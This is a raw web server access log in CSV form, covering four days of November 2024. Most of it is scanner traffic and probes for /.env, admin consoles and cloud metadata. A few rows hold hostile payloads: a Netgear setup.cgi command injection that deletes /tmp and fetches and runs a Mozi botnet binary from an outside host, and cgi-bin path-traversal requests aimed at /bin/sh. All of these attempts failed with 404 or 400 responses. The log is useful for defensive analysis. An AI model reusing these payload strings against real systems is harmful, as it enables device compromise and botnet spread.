ip,date,method,endpoint,status,size
167.94.138.43,19/Nov/2024:03:57:47 +0000,GET,/favicon.ico,404,196
5.8.11.202,19/Nov/2024:05:48:02 +0000,GET,/,200,1755
2.57.122.209,19/Nov/2024:06:12:10 +0000,GET,/,200,1755
2.57.122.209,19/Nov/2024:06:12:10 +0000,GET,/favicon.ico,404,196
205.210.31.19,19/Nov/2024:07:40:53 +0000,GET,/,200,1755
5.8.11.202,19/Nov/2024:08:04:23 +0000,,\x16\x03\x02\x01o\x01,400,226
152.42.214.50,19/Nov/2024:08:34:34 +0000,,\x16\x03\x01\x01\v\x01,400,226
152.42.214.140,19/Nov/2024:08:38:51 +0000,,\x16\x03\x01\x01\v\x01,400,226
95.214.55.79,19/Nov/2024:11:17:32 +0000,GET,/,200,1755
81.161.238.40,19/Nov/2024:11:29:01 +0000,GET,/.env,404,196
5.8.11.202,19/Nov/2024:11:46:16 +0000,GET,/,200,1755
95.214.53.205,19/Nov/2024:14:03:31 +0000,GET,/,200,1755
139.162.164.128,19/Nov/2024:14:23:31 +0000,GET,/,200,1755
185.85.239.13,19/Nov/2024:14:49:13 +0000,,\x16\x03\x01\x01\xaa\x01,400,226
194.50.16.198,19/Nov/2024:16:22:09 +0000,GET,/login.asp,404,196
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/,200,1755
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/styles.css,200,1716
185.209.120.5,19/Nov/2024:16:48:00 +0000,GET,/favicon.ico,404,196
185.209.120.5,19/Nov/2024:17:25:43 +0000,GET,/,304,
185.209.120.5,19/Nov/2024:18:01:45 +0000,GET,/,200,1755
185.209.120.5,19/Nov/2024:18:01:45 +0000,GET,/styles.css,200,1716
95.214.53.205,19/Nov/2024:18:47:00 +0000,GET,/,200,1755
125.82.242.94,19/Nov/2024:20:16:26 +0000,,-,408,
194.50.16.198,19/Nov/2024:21:30:47 +0000,GET,/,200,1755
205.210.31.8,19/Nov/2024:22:20:38 +0000,GET,/,200,1755
198.235.24.143,19/Nov/2024:22:25:03 +0000,GET,/,200,1755
95.214.53.205,19/Nov/2024:23:10:41 +0000,GET,/,200,1755
106.75.65.201,20/Nov/2024:01:18:37 +0000,GET,/,200,1755
106.75.65.201,20/Nov/2024:01:18:37 +0000,,\x16\x03\x01,400,226
106.75.65.201,20/Nov/2024:01:18:39 +0000,USER,anonymous,400,226
58.208.68.190,20/Nov/2024:01:24:47 +0000,GET,/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.208.68.190:59189/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,404,196
45.84.89.3,20/Nov/2024:01:56:56 +0000,GET,/,200,1755
65.49.1.45,20/Nov/2024:02:51:33 +0000,,\x16\x03\x01,400,226
5.79.184.27,20/Nov/2024:03:11:02 +0000,CONNECT,www.google.com:443,405,224
5.8.11.202,20/Nov/2024:03:45:10 +0000,GET,/,200,1755
1.34.111.115,20/Nov/2024:03:53:37 +0000,GET,/,200,1755
92.249.48.208,20/Nov/2024:04:43:35 +0000,GET,/,400,226
194.50.16.198,20/Nov/2024:04:45:09 +0000,POST,/apply.cgi,404,196
185.191.126.248,20/Nov/2024:05:23:19 +0000,GET,/,200,1755
46.174.191.32,20/Nov/2024:05:47:13 +0000,GET,/,200,1755
93.174.93.12,20/Nov/2024:06:28:46 +0000,GET,/,200,1755
152.42.214.140,20/Nov/2024:08:38:57 +0000,,\x16\x03\x01\x01\v\x01,400,226
92.255.57.58,20/Nov/2024:10:18:25 +0000,GET,/,200,1755
92.255.57.58,20/Nov/2024:10:46:29 +0000,GET,/solr/admin/info/system?wt=json,404,196
92.255.57.58,20/Nov/2024:11:28:11 +0000,GET,/console/,404,196
95.214.55.79,20/Nov/2024:12:59:43 +0000,GET,/,200,1755
139.59.101.104,20/Nov/2024:13:27:37 +0000,GET,/cdn-cgi/trace,404,196
95.214.53.205,20/Nov/2024:13:42:45 +0000,GET,/,200,1755
95.214.53.205,20/Nov/2024:13:42:45 +0000,GET,/cgi-bin/luci/;stok=/locale,404,196
185.209.120.11,20/Nov/2024:15:27:54 +0000,GET,/,200,1755
185.209.120.11,20/Nov/2024:15:27:54 +0000,GET,/styles.css,200,1716
185.209.120.11,20/Nov/2024:15:27:55 +0000,GET,/favicon.ico,404,196
185.209.120.11,20/Nov/2024:15:27:57 +0000,GET,/,304,
185.209.120.11,20/Nov/2024:15:28:05 +0000,GET,/,200,1755
185.209.120.11,20/Nov/2024:15:28:05 +0000,GET,/styles.css,200,1716
185.209.120.11,20/Nov/2024:15:28:10 +0000,GET,/WP-ADMIN,404,196
194.50.16.198,20/Nov/2024:17:16:39 +0000,GET,/cgi-bin/index.html,404,196
104.209.35.51,20/Nov/2024:17:35:27 +0000,GET,/portal/redlion,404,196
5.8.11.202,20/Nov/2024:18:01:36 +0000,GET,/,200,1755
5.8.11.202,20/Nov/2024:18:19:33 +0000,,\x16\x03\x02\x01o\x01,400,226
95.214.53.205,20/Nov/2024:18:58:40 +0000,GET,/,200,1755
172.105.78.45,20/Nov/2024:20:17:49 +0000,GET,/,200,1755
95.214.53.205,20/Nov/2024:20:40:49 +0000,GET,/,200,1755
81.214.143.203,20/Nov/2024:20:48:24 +0000,GET,/manager/html,404,196
95.214.53.205,20/Nov/2024:21:48:02 +0000,GET,/,200,1755
5.8.11.202,21/Nov/2024:00:22:07 +0000,,\x16\x03\x02\x01o\x01,400,226
167.94.145.100,21/Nov/2024:01:27:57 +0000,GET,/,200,1755
170.64.239.33,21/Nov/2024:03:13:00 +0000,,\x16\x03\x01,400,226
170.64.239.33,21/Nov/2024:03:13:00 +0000,GET,/,200,1755
170.64.239.33,21/Nov/2024:03:13:01 +0000,GET,/upl.php,404,196
170.64.239.33,21/Nov/2024:03:13:02 +0000,GET,/geoip/,404,196
170.64.239.33,21/Nov/2024:03:13:03 +0000,GET,/favicon.ico,404,196
170.64.239.33,21/Nov/2024:03:13:04 +0000,GET,/systembc/password.php,404,196
45.84.89.2,21/Nov/2024:04:56:39 +0000,GET,/,200,1755
80.82.70.133,21/Nov/2024:06:57:33 +0000,,\x16\x03\x02\x01o\x01,400,226
80.82.77.202,21/Nov/2024:06:58:16 +0000,GET,/,200,1755
5.8.11.202,21/Nov/2024:06:58:16 +0000,,\x16\x03\x01,400,226
5.8.11.202,21/Nov/2024:06:58:36 +0000,,\x16\x03\x01,400,226
5.8.11.202,21/Nov/2024:06:58:36 +0000,GET,/aaa9,404,196
167.94.138.52,21/Nov/2024:07:00:58 +0000,GET,/,200,1755
95.214.53.205,21/Nov/2024:07:20:59 +0000,GET,/,200,1755
93.174.93.12,21/Nov/2024:07:32:52 +0000,GET,/,200,1755
159.223.69.51,21/Nov/2024:08:39:59 +0000,GET,/cdn-cgi/trace,404,196
37.140.242.61,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
37.140.242.61,21/Nov/2024:09:30:11 +0000,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh,400,226
80.82.77.202,21/Nov/2024:10:32:12 +0000,GET,/,200,1755
47.245.119.234,21/Nov/2024:10:42:51 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
125.228.198.247,21/Nov/2024:12:55:04 +0000,GET,/,200,1755
95.214.55.43,21/Nov/2024:13:39:45 +0000,GET,/,200,1755
95.214.53.205,21/Nov/2024:14:02:38 +0000,GET,/,200,1755
95.214.53.205,21/Nov/2024:14:44:17 +0000,GET,/,200,1755
152.42.247.210,21/Nov/2024:16:34:19 +0000,GET,/cdn-cgi/trace,404,196
45.156.128.57,21/Nov/2024:16:40:55 +0000,SSH,-2.0-Go,400,226
45.156.128.56,21/Nov/2024:16:40:55 +0000,,\x16\x03\x01,400,226
103.73.183.186,21/Nov/2024:17:33:20 +0000,GET,http://metadata.google.internal/computeMetadata/v1/project/,404,196
5.8.11.202,21/Nov/2024:17:52:14 +0000,GET,/,200,1755
93.174.93.12,21/Nov/2024:20:18:46 +0000,GET,/,200,1755
185.82.219.179,21/Nov/2024:20:23:09 +0000,GET,/.env,404,196
46.174.191.28,21/Nov/2024:22:34:07 +0000,GET,/,200,1755
194.50.16.198,21/Nov/2024:22:57:32 +0000,GET,/login.asp,404,196
93.174.93.12,21/Nov/2024:23:02:59 +0000,,\x16\x03\x02\x01o\x01,400,226
47.237.132.148,22/Nov/2024:00:38:03 +0000,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,400,226
173.255.221.189,22/Nov/2024:04:01:54 +0000,GET,/,200,1755
172.104.11.34,22/Nov/2024:04:02:00 +0000,GET,/,200,1755
205.210.31.134,22/Nov/2024:04:13:20 +0000,,\x16\x03\x01,400,226
87.120.115.119,22/Nov/2024:04:59:17 +0000,GET,/_profiler/phpinfo,404,196
45.84.89.2,22/Nov/2024:07:24:07 +0000,GET,/,200,1755
114.34.240.137,22/Nov/2024:08:26:14 +0000,GET,/,200,1755
159.223.69.51,22/Nov/2024:08:34:19 +0000,,\x16\x03\x01\x01\v\x01,400,226
152.42.243.206,22/Nov/2024:08:38:24 +0000,GET,/cdn-cgi/trace,404,196
152.42.243.206,22/Nov/2024:08:38:30 +0000,,\x16\x03\x01\x01\v\x01,400,226
5.8.11.202,22/Nov/2024:09:19:24 +0000,,\x16\x03\x02\x01o\x01,400,226
205.210.31.143,22/Nov/2024:09:24:09 +0000,GET,/,200,1755
178.20.129.78,22/Nov/2024:10:10:46 +0000,GET,/,200,1755
159.89.172.232,22/Nov/2024:10:13:26 +0000,GET,/.env,404,196
209.38.98.23,22/Nov/2024:10:15:23 +0000,GET,/,200,1755
185.191.126.248,22/Nov/2024:10:33:31 +0000,GET,/,200,1755
95.214.55.43,22/Nov/2024:10:40:26 +0000,GET,/,200,1755
80.82.77.202,22/Nov/2024:10:51:52 +0000,,\x16\x03\x02\x01o\x01,400,226
148.153.56.82,22/Nov/2024:13:21:34 +0000,GET,/t5Ji,404,196
64.62.156.69,22/Nov/2024:13:22:40 +0000,GET,/,200,1755
64.62.156.71,22/Nov/2024:13:25:12 +0000,GET,/favicon.ico,404,196
